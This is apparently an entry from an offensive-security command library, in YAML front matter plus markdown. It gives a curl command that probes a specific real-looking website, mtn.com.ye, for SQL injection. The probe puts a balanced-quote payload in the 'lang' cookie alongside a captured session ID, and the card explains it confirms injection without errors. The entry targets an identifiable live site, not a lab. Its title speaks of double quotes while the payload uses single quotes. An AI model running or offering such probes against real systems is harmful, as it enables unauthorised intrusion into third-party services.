---
id: cmd-mtn-sqli-balance
data: >-
  curl -X GET "http://mtn.com.ye/index.php/search/default?t=1&x=0&y=0" -H
  "Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=en'';
  _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1;
  _gat_UA-44336198-10=1" -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64;
  rv:68.0) Gecko/20100101 Firefox/68.0"
tags:
  - sqli
  - balance
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.177Z'
verified: false
validated: true
submitted: true
---
# sqli-double-quote-balance

## Command

```bash
curl -X GET "http://mtn.com.ye/index.php/search/default?t=1&x=0&y=0" \
  -H "Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=en''; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1" \
  -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
```

## Description

Balances the SQL statement with double quotes to confirm injection without errors.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `lang=en''` | Balanced cookie | Yes |

## Examples

### Basic Usage

As above.

## Expected Output

Normal response, no errors.

## Related

- [[commands/sqli-single-quote-injection]]
- [[procedures/Confirm-SQL-Injection-with-Balanced-Quotes]]
